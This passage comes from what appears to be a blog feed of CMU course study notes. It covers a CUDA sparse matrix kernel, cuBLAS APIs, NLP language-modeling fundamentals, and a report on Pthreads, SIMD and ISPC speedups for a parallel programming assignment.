class="title">SpMVCSRKernel</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* data,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>*   col_index,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>*   row_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* x,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* y,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>    num_rows</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> row = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (row &lt; num_rows) &#123;</span><br><span class="line">        <span class="type">float</span> dot = <span class="number">0.0f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> row_start = row_ptr[row];</span><br><span class="line">        <span class="type">int</span> row_end   = row_ptr[row + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> elem = row_start; elem &lt; row_end; ++elem) &#123;</span><br><span class="line">            dot += x[col_index[elem]] * data[elem];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        y[row] += dot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cublas">cuBLAS</h2><p><strong>cuBLAS</strong> stands for <strong>CUDA Basic Linear AlgebraSubroutines</strong>.</p><p>It is NVIDIA’s highly optimized GPU implementation of the classic<strong>BLAS</strong> interface, targeting operations such as:</p><ul><li>Vector operations (Level-1 BLAS)</li><li>Matrix-vector operations (Level-2 BLAS)</li><li>Matrix-matrix operations (Level-3 BLAS, especially GEMM)</li></ul><h3 id="programming-model">Programming Model</h3><p>cuBLAS uses a <strong>handle-based API</strong>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cublasHandle_t handle;</span><br><span class="line"><span class="built_in">cublasCreate</span>(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cuBLAS calls</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cublasDestroy</span>(handle);</span><br></pre></td></tr></table></figure><p>All cuBLAS operations require a valid <code>cublasHandle_t</code>,which stores execution context such as the CUDA stream and mathmode.</p><h3 id="level-1-blas-vector-dot-product">Level-1 BLAS: Vector DotProduct</h3><p>Compute the dot product of two vectors: <span class="math display">\[\text{result} = x^T y\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSdot(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    int n,</span><br><span class="line">    const float* x, int incx,</span><br><span class="line">    const float* y, int incy,</span><br><span class="line">    float* result</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>Key points:</strong></p><ul><li><code>n</code> is the number of elements</li><li><code>incx</code>, <code>incy</code> specify the stride betweenelements</li><li><code>x</code> and <code>y</code> must reside in <strong>devicememory</strong></li><li><code>result</code> is written to <strong>host memory</strong></li></ul><p>This is a basic building block for norms, projections, andreductions.</p><hr /><h3 id="level-2-blas-matrixvector-multiplication">Level-2 BLAS:Matrix–Vector Multiplication</h3><p>Compute: <span class="math display">\[y = \alpha A x + \beta y\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSgemv(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    cublasOperation_t trans,</span><br><span class="line">    int m, int n,</span><br><span class="line">    const float* alpha,</span><br><span class="line">    const float* A, int lda,</span><br><span class="line">    const float* x, int incx,</span><br><span class="line">    const float* beta,</span><br><span class="line">    float* y, int incy</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>Key points:</strong></p><ul><li><code>A</code> is an <span class="math inline">\(m \times n\)</span>matrix stored in <strong>column-major</strong> order</li><li><code>trans</code> controls whether <code>A</code> istransposed</li><li><code>lda</code> is the leading dimension of <code>A</code></li><li>All vectors and matrices are in <strong>device memory</strong></li></ul><p>This operation is common in iterative solvers and neural networklayers.</p><hr /><h3 id="level-3-blas-matrixmatrix-multiplication-gemm">Level-3 BLAS:Matrix–Matrix Multiplication (GEMM)</h3><p>Compute: <span class="math display">\[C = \alpha A B + \beta C\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSgemm(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    cublasOperation_t transA,</span><br><span class="line">    cublasOperation_t transB,</span><br><span class="line">    int m, int n, int k,</span><br><span class="line">    const float* alpha,</span><br><span class="line">    const float* A, int lda,</span><br><span class="line">    const float* B, int ldb,</span><br><span class="line">    const float* beta,</span><br><span class="line">    float* C, int ldc</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>Key points:</strong></p><ul><li>This is the <strong>most important cuBLAS API</strong></li><li><code>A</code>, <code>B</code>, <code>C</code> are all stored in<strong>column-major</strong> layout</li><li><code>m</code>, <code>n</code>, <code>k</code> define matrixshapes</li><li>Internally uses <strong>tiling, shared memory, and Tensor Cores(when available)</strong></li></ul><p>GEMM is the performance backbone of deep learning and scientificcomputing.</p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> GPU Programming </tag>
            
            <tag> 11868 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Fundamentals</title>
      <link href="/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/"/>
      <url>/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/</url>
      
        <content type="html"><![CDATA[<h1 id="lec1-introduction-and-fundamentals">Lec1 Introduction andFundamentals</h1><h2 id="bag-of-words">Bag of Words</h2><p>A simplified representation used in NLP where a text (such as asentence or a document) is represented as the <strong>bag (multiset) ofits words</strong>, disregarding grammar and even word order but keeping<strong>multiplicity (frequency)</strong>.</p><p><strong>Pros:</strong></p><ul><li><strong>Simplicity:</strong> Very easy to understand andimplement.</li><li><strong>Efficiency:</strong> Computationally inexpensive for basictasks like document classification or spam detection.</li><li><strong>Interpretability:</strong> You can easily see which words(features) are most important for a prediction.</li></ul><p><strong>Cons:</strong></p><ul><li><strong>Loss of Context:</strong> It ignores word order (e.g., “Notgood” and “Good not” look identical).</li><li><strong>Sparsity &amp; High Dimensionality:</strong> Similar toOne-hot, the vector size grows with the vocabulary, leading to “curse ofdimensionality.”</li><li><strong>No Semantic Similarity:</strong> It cannot capture the factthat “boat” and “ship” are related.</li></ul><h2 id="one-hot-encoding">One-hot Encoding</h2><p>Definition: Convet discret values into binary vector, and only oneposition is 1, others are 0.</p><p>Cons:</p><ul><li>simple &amp; straightforward</li><li>Every token is a single representation</li></ul><p>Pros:</p><ul><li>The number of tokens means the number of vector’s demension</li><li>Sparsity, need more storage</li><li>Cannot represent the relationship of two different words</li></ul><h1 id="lec2-learned-representation">Lec2 Learned Representation</h1><h2 id="subword-model-e.g.-bpe-fasttext">Subword Model (e.g., BPE,FastText)</h2><p><strong>Definition:</strong> Splits words into smaller units(subwords or character n-grams). Frequent words remain whole, while rarewords are broken down (e.g., “unhappiness” <spanclass="math inline">\(\rightarrow\)</span> “un”, “happi”, “ness”).</p><ul><li><p><strong>Pros:</strong></p><ul><li>Limited vocab size / handle same root word</li><li><strong>Handles OOV (Out-of-Vocabulary):</strong> Can generateembeddings for words never seen during training by summing itssubwords.</li><li><strong>Morphological Richness:</strong> Excellent for languageswith many word forms (like Turkish or German).</li></ul><p><strong>Cons:</strong></p><ul><li><strong>Computational Overhead:</strong> Training and inference areslower because the model has to process more tokens per word.</li><li><strong>Over-tokenization:</strong> Some words may be broken intotoo many meaningless fragments, losing “whole-word” semanticintegrity.</li><li><strong>Language Dependency:</strong> The efficiency of subwordsplitting varies significantly across different languages (e.g., Englishvs. Chinese).</li></ul></li></ul><h2 id="continuous-bag-of-words">Continuous Bag of Words</h2><p><strong>Definition:</strong> A neural network-based model (Word2vec)that predicts a <strong>target center word</strong> based on itssurrounding <strong>context words</strong>.</p><p><strong>Pros:</strong></p><ul><li><strong>Fast Training:</strong> Much faster than Skip-gram becauseit performs only one prediction per context window.</li><li><strong>Better for Frequent Words:</strong> Provides a more stablerepresentation for words that appear often in the data.</li><li><strong>Low Dimensionality:</strong> Produces dense, fixed-sizevectors (e.g., 300 dimensions) instead of sparse ones.</li></ul><p><strong>Cons:</strong></p><ul><li><strong>Position Blurring:</strong> It averages context wordvectors, meaning it <strong>ignores the specific order</strong> of wordsin the window.</li><li><strong>Underperforms on Rare Words:</strong> Since it averagescontexts, rare words tend to get “smoothed out” or drowned by frequentneighbors.</li></ul><hr /><h1 id="lec3-language-modeling">Lec3 Language Modeling</h1><p>A <strong>language model (LM)</strong> defines a probabilitydistribution over all possible sequences of tokens: <spanclass="math inline">\(P(X) = P(x_1, x_2, \dots, x_T)\)</span></p><p><strong>Applications:</strong> Score sequences (fluency), textgeneration, conditional generation (MT, summarization), QA,classification, grammar correction.</p><h2 id="autoregressive-language-models">Autoregressive LanguageModels</h2><p>Factorize joint probability into next-token predictions: <spanclass="math display">\[P(X) = \prod_{t=1}^{T} P(x_t \mid x_{&lt;t})\]</span></p><p>This reduces sequence modeling to next-token modeling, with outputspace being the vocabulary.</p><h2 id="bigram-models">Bigram Models</h2><p>Predict next token using <strong>only the previous token</strong>:<span class="math inline">\(P(X) \approx \prod_{t=1}^{T} P(x_t \midx_{t-1})\)</span></p><p><strong>Training (MLE):</strong> <span class="math display">\[P(x_t \mid x_{t-1}) = \frac{\text{count}(x_{t-1}, x_t)}{\sum_{x&#39;}\text{count}(x_{t-1}, x&#39;)}\]</span></p><ul><li><strong>Pros:</strong> Simple, fast, introduces core LM concepts(MLE, log-space, autoregressive generation)</li><li><strong>Cons:</strong> Limited context (1 token), no long-rangedependencies, no word similarity</li></ul><h2 id="training-objective">Training Objective</h2><p>Goal: <span class="math inline">\(\max_\theta \sum_{x \in D} \logp_\theta(x)\)</span> — equivalent to <spanclass="math inline">\(\min_\theta D_{KL}(p^* \parallelp_\theta)\)</span></p><p><strong>Log space:</strong> Prevents underflow, turns multiplicationinto addition: <span class="math inline">\(\log P(X) = \sum_{t} \logP(x_t \mid x_{&lt;t})\)</span></p><h2 id="text-generation">Text Generation</h2><p>Iterative sampling: Start with <code>[S]</code> → sample <spanclass="math inline">\(x_t \sim P(x_t \mid x_{&lt;t})\)</span> → append →stop at <code>[EOS]</code></p><h2 id="evaluation-metrics">Evaluation Metrics</h2><p><strong>Negative Log-Likelihood:</strong> <spanclass="math inline">\(\text{NLL} = - \sum_{i,t} \log P(x_t^{(i)} \midx_{&lt;t}^{(i)})\)</span> (lower is better)</p><p><strong>Perplexity:</strong> <span class="math inline">\(\text{PPL} =\exp\left(-\frac{1}{T}\sum_{i,t} \log P(x_t^{(i)} \midx_{&lt;t}^{(i)})\right)\)</span> — measures model “confusion”, lower isbetter</p><h2 id="n-gram-models">N-gram Models</h2><p>Condition on previous <span class="math inline">\(n-1\)</span>tokens: <span class="math inline">\(P(X) \approx \prod_{t=1}^{T} P(x_t\mid x_{t-n+1:t-1})\)</span></p><p><strong>Smoothing</strong> (add-one): <spanclass="math inline">\(P(x_t \mid c) = \frac{1 + \text{count}(c,x_t)}{|V| + \sum_{x&#39;} \text{count}(c, x&#39;)}\)</span></p><ul><li><strong>Pros:</strong> Longer context, fast, interpretable, strongmemorization</li><li><strong>Cons:</strong> No parameter sharing, can’t handlelong-distance dependencies, vocab explosion with large <spanclass="math inline">\(n\)</span></li></ul><h2 id="feedforward-neural-lms-bengio-et-al.-2003">Feedforward NeuralLMs (Bengio et al., 2003)</h2><p>Replace count tables with neural networks: word embeddings →concatenate → hidden layers → softmax</p><p><span class="math display">\[P(x_t \mid x_{&lt;t}) = \text{softmax}(W h), \quad L_t = -\log P(x_t\mid x_{&lt;t})\]</span></p><ul><li><strong>Pros:</strong> Parameter sharing across similarwords/contexts, dense representations, better generalization</li><li><strong>Cons:</strong> Fixed context window (addressed byRNNs/Transformers)</li></ul><h2 id="practical-training">Practical Training</h2><ul><li><strong>Dataset splits:</strong> Train (fit params) / Validation(tune hyperparams) / Test (final eval, used once)</li><li><strong>Overfitting:</strong> Val loss increases while train lossdecreases → use regularization, early stopping</li><li><strong>Weight init:</strong> Xavier: <span class="math inline">\(W\sim \mathcal{U}\left(-\sqrt{\frac{6}{n_{in}+n_{out}}},\sqrt{\frac{6}{n_{in}+n_{out}}}\right)\)</span></li><li><strong>Learning rate:</strong> Large early (exploration) → smalllater (convergence); warmup stabilizes early gradients</li><li><strong>Batching:</strong> Pad variable-length sequences, maskpadding in forward pass and loss</li></ul><h2 id="key-takeaways">Key Takeaways</h2><ul><li>LM = probabilistic sequence modeling with autoregressivefactorization</li><li>Progression: Bigram → N-gram → Neural LMs (same MLE objectivethroughout)</li><li>Careful evaluation and experimental setup are essential</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 Advanced NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15618 Assignment 1 Report</title>
      <link href="/2026/01/17/15618-Parallel-Programming/15618%20Assignment1%20Report/"/>
      <url>/2026/01/17/15618-Parallel-Programming/15618%20Assignment1%20Report/</url>
      
        <content type="html"><![CDATA[<h1id="assignment-1-exploring-multi-core-and-simd-parallelism-report">15618Assignment 1 Exploring Multi-Core and SIMD Parallelism Report</h1><h2 id="problem-1-parallel-fractal-generation-using-pthreads">Problem 1:Parallel Fractal Generation Using Pthreads</h2><h3 id="speedup-graph">1.1 Speedup Graph</h3><p><strong>Implementation:</strong> Multi-threaded Mandelbrot generationusing horizontal striping (spatial decomposition). Each thread<u>processes consecutive rows</u>. For cases where the number of rows(900) is not evenly divisible by the number of threads, the first (900 %T) threads are <u>assigned one additional row</u> to ensure all rows areprocessed.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116145929648.png" alt="image-20260116145929648" style="zoom: 25%;" /></p><blockquote><p>Note: 16 threads use the same 8 physical cores viahyperthreading.</p></blockquote><p><strong><u>And speedup is not linear.</u></strong> With 8 cores, weachieve only <strong>3.97× speedup</strong> (49.6% efficiency) insteadof the ideal 8×.</p><p><u><strong>Hypothesis: Load Imbalance</strong>:</u></p><p>The horizontal striping strategy creates severe load imbalancebecause:</p><ul><li><strong>Top/bottom rows</strong>: Points far from Mandelbrotboundary diverge quickly (~10-50 iterations)</li><li><strong>Middle rows</strong>: Points near the boundary requiremaximum iterations (256)</li><li>Result: Threads assigned to middle rows work significantlylonger</li></ul><p>Since total time equals the slowest thread, unbalanced worksignificantly reduces speedup.</p><blockquote><p>Key Obeservation:</p><p>The sharp drop in efficiency from 2 threads (98%) to 4 threads (60%)confirms that load imbalance is the dominant performance bottleneck, nothardware limitations.</p></blockquote><h3 id="per-thread-timing-measurements">1.2 Per-Thread TimingMeasurements</h3><p>To verify the load imbalance hypothesis from Section 1.1, Iinstrumented the code by adding timing measurements at the beginning andend of workerThreadStart() using CycleTimer::currentSeconds().</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116151418165.png"alt="image-20260116151418165" /><figcaption aria-hidden="true">image-20260116151418165</figcaption></figure><p><strong><u>Analysis: Load Imbalance Confirmed</u></strong></p><p>The timing visualization clearly shows <strong>severe loadimbalance</strong> across all configurations. The color gradient revealsthe problem: threads processing top and bottom rows (green bars) finishquickly, while threads handling middle rows (red bars) takesignificantly longer. This pattern directly corresponds to theMandelbrot set’s computational structure—boundary regions requiremaximum iterations while outer regions diverge quickly.</p><p>For 4 threads, this imbalance means two threads sit idle for most ofthe execution time while two others continue working, wasting half theavailable CPU capacity. With 8 threads, the problem worsens: mostthreads finish early and wait for the few threads stuck processingexpensive boundary rows. This uneven distribution explains why weachieve only 3.97× speedup with 8 cores instead of the ideal 8×—theexecution time is bottlenecked by the slowest thread, not the averageworkload.</p><h3 id="improve-speedup">1.3 Improve Speedup</h3><p><strong>Strategy: Interleaved Row Assignment</strong></p><p>Instead of horizontal striping (consecutive rows per thread), Iimplemented interleaved assignment where thread <em>i</em> processesrows <em>i</em>, <em>i+T</em>, <em>i+2T</em>, <em>i+3T</em>, …, where<em>T</em> is the total number of threads.</p><p>This simple static assignment ensures each thread processes a mix ofcomputationally cheap rows (top/bottom of image) and expensive rows(near Mandelbrot boundary), automatically balancing the workload withoutany synchronization.</p><table><thead><tr class="header"><th style="text-align: left;">Threads</th><th style="text-align: left;">View 1 Speedup</th><th style="text-align: left;">View 2 Speedup</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">4</td><td style="text-align: left;">3.84×</td><td style="text-align: left;">3.82×</td></tr><tr class="even"><td style="text-align: left;">8</td><td style="text-align: left;"><strong>7.56×</strong></td><td style="text-align: left;"><strong>7.53×</strong></td></tr><tr class="odd"><td style="text-align: left;">16</td><td style="text-align: left;">7.61×</td><td style="text-align: left;">7.35×</td></tr></tbody></table><p><strong><u>Scaling Behavior Analysis:</u></strong></p><p><strong>4→8 threads (4→8 cores):</strong> Speedup nearly doubles,demonstrating excellent scaling as each additional thread runs on adedicated physical core with full computational resources.</p><p><strong>8→16 threads (8 cores with hyperthreading):</strong>Performance improvement is limited or even decreases (View 2). Sinceboth configurations share the same 8 physical cores, the 16 threadscompete for execution units and cache via hyperthreading. Forcompute-intensive Mandelbrot workloads with minimal memory stalls,hyperthreading provides little benefit.</p><h2id="problem-2-vectorizing-code-using-simd-intrinsics"><strong>Problem 2:Vectorizing Code Using SIMD Intrinsics</strong></h2><h3 id="clampedexpvector">2.1 clampedExpVector</h3><p>The implementation follows the exponentiation by squaring algorithmand processes W elements in parallel per vector instruction.</p><p><strong>Key Implementation Details:</strong></p><ol type="1"><li><strong>Loop Structure</strong>: Process array in chunks ofVECTOR_WIDTH, with each iteration handling one vector of elements</li><li><strong>Mask Management</strong>: Use maskActive to track whichlanes still have exponent &gt; 0, terminating the loop when all lanescomplete</li><li><strong>Boundary Handling</strong>: Dynamically create masks using_cmu418_init_ones(count) to correctly handle cases where N is not amultiple of W</li><li><strong>Result Clamping</strong>: Vectorized the clamping logic tolimit results exceeding 4.18</li></ol><p><strong>Correctness</strong>: Passed all test cases includingnon-aligned array sizes (e.g., N=3, N=10, N=100)</p><h3 id="vector-width-sweep-experiments">2.2 Vector Width SweepExperiments</h3><p><strong>Experimental Setup</strong>: Ran ./vrun -s 10000 withVECTOR_WIDTH ∈ {2, 4, 8, 16, 32}</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116181624182.png"alt="image-20260116181624182" /><figcaption aria-hidden="true">image-20260116181624182</figcaption></figure><ol type="1"><li><p><strong>Vector Utilization Analysis</strong></p><p><strong>Observation</strong>: Vector utilization remains high(88.51%-89.45%) across all vector widths, with <u>only 0.94%degradation</u> as W increases from 2 to 32. This demonstrates <u>lowsensitivity to vector width</u>.</p><p>This is because the iteration counts are proportional tolog₂(exponent), meaning a 10× difference in exponents (e.g., 100 vs1000) results in only ~3 additional iterations. Since vectorinstructions must <u>wait for the slowest lane to complete</u>, eachvector’s iteration count is determined by the element with the maximumiterations. This low variance <u>ensures elements within a vector finishat similar times, minimizing idle lanes regardless of vectorwidth</u>.</p></li><li><p><strong>Number of Vector Instructions Analysis</strong></p><p><strong>Observation</strong>: Total vector instructions decrease from286,614 (W=2) to 18,471 (W=32), <u>approximately halving with eachdoubling of vector width</u>. The measured instruction counts closelyfollow the theoretical O(N/W) curve (red dashed line), confirmingnear-ideal scaling.</p><p>The total instruction count <u>is determined by how many times theouter loop runs</u>. When vector width doubles (e.g., W=4 to W=8), eachvector instruction can process twice as many elements, so the outer looponly needs to run half as many times. Since the work inside each loopiteration stays the same, <u>doubling W directly halves the totalinstructions</u>. This <strong>93.6% reduction</strong> from W=2 to W=32demonstrates that vectorization delivers the expected linearspeedup.</p></li></ol><h3 id="arraysumvector">2.3 <strong>arraySumVector</strong></h3><p>Implemented a tree reduction algorithm achieving <strong>O(N/W +log₂W)</strong> span complexity:</p><p><strong>Algorithm:</strong></p><ol type="1"><li><strong>Phase 1 - Vector Accumulation (O(N/W))</strong>: Sum allarray elements into a single vector register using vector addition</li><li><strong>Phase 2 - Tree Reduction (O(log₂W))</strong>: Reduce Welements within the vector to a single scalar using hadd and interleaveoperations in log₂W rounds</li></ol><p><strong>Correctness</strong>: Passed all tests for W = 2, 4, 8,16</p><h2 id="problem-3-parallel-fractal-generation-using-ispc">Problem 3:Parallel Fractal Generation Using ISPC</h2><h3 id="part-1-ispc-simd-parallelization-analysis">3.1 Part 1: ISPC SIMDParallelization Analysis</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/Figure_1.png" alt="Figure_1" style="zoom:70%;" /></p><h4 id="x-theoretical-maximum-speedup">8x theoretical maximumspeedup</h4><p>The ISPC compiler is configured to emit 8-way AVX2 SIMD instructions,which can <u>process 8 floating-point values simultaneously</u>.Therefore, the theoretical maximum speedup is <strong>8x</strong>compared to the serial implementation.</p><h4 id="simd-divergence-stall">SIMD Divergence (Stall)</h4><p>The observed average speedup of <strong>4.48x</strong> is only 56% ofthe theoretical 8x maximum because <u>different pixels require differentnumbers of iterations</u> to determine if they’re in the Mandelbrotset—when processing 8 pixels together in SIMD, some finish quickly whileothers take much longer, forcing <u>all lanes to wait for the slowestone</u>, which wastes computation on idle lanes.</p><h4 id="performance-variation-across-views">Performance Variation AcrossViews</h4><p>Different views show speedups ranging from <strong>4.01x to4.88x</strong> (View 6: 4.88x best, View 5: 4.01x worst). Views with<u>complex fractal boundaries have neighboring pixels with verydifferent iteration counts</u>, causing more SIMD lanes to wait idle,while views with <u>smoother regions have pixels that finish at similartimes</u>, reducing wasted computation.</p><h3 id="part-2-ispc-tasks">3.2 Part 2: ISPC Tasks</h3><h4 id="speedup-with-tasks">Speedup with –tasks</h4><table><colgroup><col style="width: 34%" /><col style="width: 14%" /><col style="width: 26%" /><col style="width: 23%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Implementation</th><th style="text-align: left;">Time (ms)</th><th style="text-align: left;">Speedup vs Serial</th><th style="text-align: left;">Speedup vs ISPC</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Serial</td><td style="text-align: left;">176.369</td><td style="text-align: left;">1.00x</td><td style="text-align: left;">-</td></tr><tr class="even"><td style="text-align: left;">ISPC (SIMD only)</td><td style="text-align: left;">37.019</td><td style="text-align: left;">4.76x</td><td style="text-align: left;">1.00x</td></tr><tr class="odd"><td style="text-align: left;">ISPC + Tasks (2 tasks)</td><td style="text-align: left;">18.721</td><td style="text-align: left;"><strong>9.42x</strong></td><td style="text-align: left;"><strong>1.98x</strong></td></tr></tbody></table><p>The 2x improvement from tasks makes sense because the currentimplementation only creates 2 tasks, utilizing only 2 out of 8 cores.Performance can be significantly improved by increasing the taskcount.</p><h4 id="find-the-optimal-tasks-count">Find the optimal tasks count</h4><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116231307425.png"alt="image-20260116231307425" /><figcaption aria-hidden="true">image-20260116231307425</figcaption></figure><p><u><strong>Optimal number of tasks is 16</strong></u></p><p>The system has <strong>8 physical cores withhyper-threading</strong>, allowing <strong>16 hardware threads</strong>to run simultaneously. Using 16 tasks achieves the best performance(<strong>32.49× speedup</strong>) because:</p><ol type="1"><li><strong>Matches hardware capacity</strong>: 16 tasks fully utilizeall 16 hardware threads, keeping all execution units busy.</li><li><strong>Better load balancing</strong>: The Mandelbrot computationhas uneven workload—fractal boundaries require many more iterations thansolid regions. With only 2 tasks, one task might get stuck on a heavyregion while the other finishes early. With 16 smaller tasks, workdistributes more evenly across cores.</li><li><strong>Diminishing returns beyond 16</strong>: Using 32 tasks(32.86×) shows minimal improvement over 16 tasks because task schedulingoverhead increases while load balancing benefits plateau.</li></ol><h4 id="pthread-vs-ispc-tasks">Pthread vs ISPC Tasks</h4><p>Pthreads are OS-level threads with significant overhead. Launching10,000 of them would likely crash or severely slow down a system due toexcessive memory consumption and context switching.</p><p>In contrast, ISPC tasks are lightweight logical units. The runtimemaps them onto a small, fixed thread pool (typically matching the CPUcore count). Launching 10,000 tasks is efficient because they arescheduled via a task queue.</p><p><strong>The key difference</strong> is Pthreads are forcoarse-grained parallelism (fewer tasks, high overhead), while ISPCtasks enable fine-grained data parallelism (many tasks, low overhead).This makes ISPC ideal for SPMD-style operations like pixel-levelprocessing.</p><h2 id="problem-4-iterative-square-root"><strong>Problem 4: IterativeSquare Root</strong></h2><h3 id="speedup">4.1 Speedup</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Serial: 682.707 ms</span><br><span class="line">ISPC (no tasks): 145.532 ms</span><br><span class="line">ISPC (with tasks): 20.079 ms</span><br><span class="line"></span><br><span class="line">SIMD speedup: 4.69x</span><br><span class="line">Multi-core speedup: 7.25x (145.532/20.079)</span><br><span class="line">Total speedup: 34.00x</span><br></pre></td></tr></table></figure><h3 id="initgood">4.2 initGood</h3><p><strong>Implementation</strong>: Set all values to<code>2.999f</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Serial: 1698.132 ms</span><br><span class="line">ISPC (no tasks): 297.302 ms</span><br><span class="line">ISPC (with tasks): 33.920 ms</span><br><span class="line"></span><br><span class="line">SIMD speedup: 5.71x</span><br><span class="line">Multi-core speedup: 8.76x (297.302/33.920)</span><br><span class="line">Total speedup: 50.06x</span><br></pre></td></tr></table></figure><p>This choice maximizes speedup by:</p><ul><li><p><strong>Perfect SIMD efficiency</strong>: All elements<u>converge in identical iterations</u>, eliminating lane divergence.Every SIMD lane performs the same amount of work and <u>finishessimultaneously with no idle waiting.</u> SIMD speedup <u>improved from4.69x (random) to 5.71x</u>.</p><p><strong>Maximum multi-core benefit with hyper-threading</strong>: Theuniform heavy workload enables exceptional multi-core scaling.<u>Multi-core speedup reached 8.76x, exceeding the baseline 7.25x</u>.This demonstrates the <u>hyper-threading effect</u> mentioned in theassignment - when all threads execute identical heavy workloads,hyper-threading can provide additional performance beyond the physicalcore count.</p></li></ul><h3 id="initbad">4.3 initBad</h3><p><strong>Implementation</strong>: Alternate between<code>2.999f</code> and <code>1.0f</code> every 8 elements</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Serial: 234.384 ms</span><br><span class="line">ISPC (no tasks): 297.430 ms</span><br><span class="line">ISPC (with tasks): 33.926 ms</span><br><span class="line"></span><br><span class="line">SIMD speedup: 0.79x</span><br><span class="line">Multi-core speedup: 8.77x (297.430/33.926)</span><br><span class="line">Total speedup: 6.91x</span><br></pre></td></tr></table></figure><p><strong>Choice of values</strong>: <code>2.999f</code> requires muchmore iterations, while <code>1.0f</code> requires ~0 iterations(matching the initial guess). This creates maximum iteration countdivergence within each SIMD gang.</p><p><strong>SIMD performance</strong>: This pattern creates <u>maximumwork divergence within each SIMD vector</u> (gang size = 8), with 1 slowelement and 7 fast elements per vector. SIMD operates in lockstep whereall lanes must wait for the slowest lane, <u>performance drops belowserial execution (0.79x)</u>.</p><p><strong>Multi-core performance</strong>: Multi-core speedup<u>remains very high at 8.77x</u>, nearly identical to initGood (8.76x).<u>The pattern repeats uniformly across the array</u> (every 8th elementis slow), ensuring <u>balanced workload distribution across threads</u>despite severe SIMD inefficiency within individual vectors.</p><h2 id="problem-5-blas-saxpy"><strong>Problem 5: BLAS</strong>saxpy</h2><h3 id="analysis-of-saxpys-performance">5.1 Analysis of saxpy’sperformance</h3><table><colgroup><col style="width: 19%" /><col style="width: 14%" /><col style="width: 23%" /><col style="width: 29%" /><col style="width: 13%" /></colgroup><thead><tr class="header"><th>Version</th><th>Time (ms)</th><th>Bandwidth (GB/s)</th><th>Performance (GFLOPS)</th><th>Speedup</th></tr></thead><tbody><tr class="odd"><td>Serial</td><td>11.356</td><td>26.243</td><td>1.761</td><td>1.00x</td></tr><tr 